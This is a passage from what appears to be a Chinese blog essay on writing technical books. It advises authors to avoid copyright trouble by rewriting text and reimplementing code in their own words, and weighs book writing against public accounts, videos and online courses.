     这里就涉及到版权问题，先要说明，作者不能抱有任何幻想，如果出了版权问题，书没出版还好，如果已经出版了，作者不仅要赔钱，而且在业内就会有不好的名声，可谓身败名裂。但其实要避免版权问题一点也不难。

    1 不能抄袭网上现有的内容，哪怕一句也不行。对此，作者可以在理解人家语句含义的基础上改写。
    
    2 不能抄袭人家书上现有的目录，更不能抄袭人家书上的话，同样一句也不行，对应的解决方法同样是在理解的基础上改写。
    
    3 不能抄袭github上或者任何地方别人的代码，哪怕这个代码是开源的。对此，你可以在理解对方代码的基础上，先运行通，然后一定得自己新建一个项目，在你的项目里参考别人的代码实现你的功能，在这个过程中不能有大段的复制粘贴操作。也就是说，你的代码和别人的代码，在注释，变量命名，类名和方法名上不能有雷同的地方，当然你还可以额外加上你自己的功能。
    
    4 至于在写技术和案例介绍时，你就可以用你自己的话来说，这样也不会出现版权问题。 
    
    用了上述办法以后，作者就可以在参考现有资料的基础上，充分加上属于你的功能，写上你独到的理解，从而高效地出版属于你自己的书。

总结：在国内知名出版社出书，其实是个体力活
    可能当下，写公众号和录视频等的方式，挣钱收益要高于出书，不过话可以这样说，经营公众号和录制视频也是个长期的事情，在短时间里可能未必有收益，如果不是系统地发表内容的话，可能甚至不会有收益。所以出书可能是个非常好的前期准备工作，你靠出书系统积累了素材，靠出书整合了你的知识体系，那么在此基础上，靠公众号或者录视频挣钱可能就会事半功倍。
不过老实说，写书的意义不在于赚钱。仅仅从赚钱的角度来说，出网课可能更划算一些。但是如果想给自己的职业生涯留点东西，写书意义大于出网课。


